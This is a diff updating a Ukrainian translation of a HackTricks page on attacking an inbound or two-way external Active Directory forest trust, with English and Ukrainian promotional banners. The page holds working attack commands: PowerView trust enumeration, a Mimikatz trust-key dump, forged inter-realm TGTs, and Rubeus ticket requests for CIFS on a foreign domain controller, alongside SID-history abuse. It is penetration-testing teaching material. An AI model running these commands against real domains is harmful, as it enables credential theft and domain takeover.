@@ -1,22 +1,25 @@
-# Зовнішній лісовий домен - Односторонній (вхідний) або двосторонній
+# External Forest Domain - OneWay (Inbound) or bidirectional
+
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-* Ви працюєте в **кібербезпецівій компанії**? Хочете побачити, як ваша **компанія рекламується на HackTricks**? або хочете мати доступ до **останньої версії PEASS або завантажити HackTricks у форматі PDF**? Перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
-* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
-* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
-* **Приєднуйтесь до** [**💬**](https://emojipedia.org/speech-balloon/) [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за мною на **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Поділіться своїми хакерськими трюками, надсилайте PR до [репозиторію hacktricks](https://github.com/carlospolop/hacktricks) та [репозиторію hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
 У цьому сценарії зовнішній домен довіряє вам (або обидва довіряють один одному), тому ви можете отримати певний доступ до нього.
 
-## Перелік
+## Enumeration
 
-По-перше, вам потрібно **перелічити** **довіру**:
+По-перше, вам потрібно **перерахувати** **довіру**:
 ```powershell
 Get-DomainTrust
 SourceName      : a.domain.local   --> Current domain
@@ -66,38 +69,42 @@ IsDomain     : True
 # You may also enumerate where foreign groups and/or users have been assigned
 # local admin access via Restricted Group by enumerating the GPOs in the foreign domain.
 ```
-Під час попередньої переліку було виявлено, що користувач **`crossuser`** знаходиться в групі **`External Admins`**, яка має **адміністративний доступ** всередині **DC зовнішнього домену**.
+У попередній енумерації було виявлено, що користувач **`crossuser`** знаходиться в групі **`External Admins`**, яка має **адміністративний доступ** всередині **DC зовнішнього домену**.
 
 ## Початковий доступ
 
-Якщо ви **не змогли** знайти жодного **спеціального** доступу вашого користувача в іншому домені, ви все ще можете повернутися до методології AD та спробувати **підняття привілеїв від непривілейованого користувача** (наприклад, такі речі, як kerberoasting):
+Якщо ви **не змогли** знайти жодного **спеціального** доступу вашого користувача в іншому домені, ви все ще можете повернутися до методології AD і спробувати **підвищити привілеї з непривабливого користувача** (такі речі, як, наприклад, kerberoasting):
 
-Ви можете використовувати функції **Powerview** для **переліку** **іншого домену**, використовуючи параметр `-Domain`, як у:
+Ви можете використовувати **функції Powerview** для **енумерації** **іншого домену** за допомогою параметра `-Domain`, як у:
 ```powershell
 Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
 ```
+{% content-ref url="./" %}
+[.](./)
+{% endcontent-ref %}
+
 ## Імітація
 
-### Вхід в систему
+### Увійти
 
-Використовуючи звичайний метод з обліковими даними користувачів, які мають доступ до зовнішнього домену, ви повинні мати можливість отримати доступ:
+Використовуючи звичайний метод з обліковими даними користувача, який має доступ до зовнішнього домену, ви повинні мати можливість отримати доступ:
 ```powershell
 Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
 ```
-### Зловживання історією SID
+### Зловживання SID Історією
 
-Ви також можете зловживати [**історією SID**](sid-history-injection.md) через довіру між лісами.
+Ви також можете зловживати [**SID Історією**](sid-history-injection.md) через лісовий довірчий зв'язок.
 
-Якщо користувач **переміщений з одного лісу в інший** і **фільтрація SID не увімкнена**, стає можливим **додати SID з іншого лісу**, і цей **SID** буде **доданий** до **токену користувача** при аутентифікації **через довіру**.
+Якщо користувача **мігрують з одного лісу в інший** і **фільтрація SID не ввімкнена**, стає можливим **додати SID з іншого лісу**, і цей **SID** буде **додано** до **токена користувача** під час автентифікації **через довірчий зв'язок**.
 
 {% hint style="warning" %}
-Нагадуємо, що ви можете отримати ключ підпису за допомогою
+Нагадаємо, ви можете отримати ключ підпису з
 ```powershell
 Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
 ```
 {% endhint %}
 
-Ви можете **підписати** ключ **довіри** **TGT, підробляючи** користувача поточного домену.
+Ви могли б **підписати** **достовірним** ключем **TGT, що імітує** користувача поточного домену.
 ```bash
 # Get a TGT for the cross-domain privileged user to the other domain
 Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'
@@ -108,7 +115,7 @@ Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /d
 
 # Now you have a TGS to access the CIFS service of the domain controller
 ```
-### Повний шлях імперсонації користувача
+### Повний спосіб імплементації користувача
 ```bash
 # Get a TGT of the user with cross-domain permissions
 Rubeus.exe asktgt /user:crossuser /domain:sub.domain.local /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap
@@ -122,14 +129,17 @@ Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /d
 
 # Now you have a TGS to access the CIFS service of the domain controller
 ```
+{% hint style="success" %}
+Вивчайте та практикуйте AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Вивчайте та практикуйте GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Підтримайте HackTricks</summary>
 
-* Чи працюєте ви в **кібербезпеці компанії**? Хочете побачити вашу **компанію рекламовану на HackTricks**? або хочете мати доступ до **останньої версії PEASS або завантажити HackTricks у форматі PDF**? Перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
-* Відкрийте [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
-* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
-* **Приєднуйтесь до** [**💬**](https://emojipedia.org/speech-balloon/) [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за мною на **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Поділіться своїми хакерськими трюками, надсилайте PR до [репозиторію hacktricks](https://github.com/carlospolop/hacktricks) та [репозиторію hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
+* Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
+* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами в **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Діліться хакерськими трюками, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на github.
 
 </details>
+{% endhint %}
